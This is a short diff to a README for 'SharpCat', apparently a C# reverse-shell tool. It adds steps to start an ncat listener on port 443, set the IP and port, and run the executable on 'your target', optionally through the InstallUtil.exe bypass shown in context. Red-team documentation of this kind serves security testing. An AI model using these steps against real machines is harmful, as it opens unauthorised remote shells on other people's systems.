@@ -24,6 +24,10 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToCo
 
 ### How to use it:
 
+Setup a remote TCP Listener (for example ncat -lvp 443) https://nmap.org/ncat/
+
+Change IP/Port as needed, then Compile and run the SharpCat Executable on your target (or use the above InstallUtil trick).
+
 Within the Remote Command Shell you can run PowerShell commands as follow:
 ```
 C:\>PowerShell "Get-Help Invoke-*"
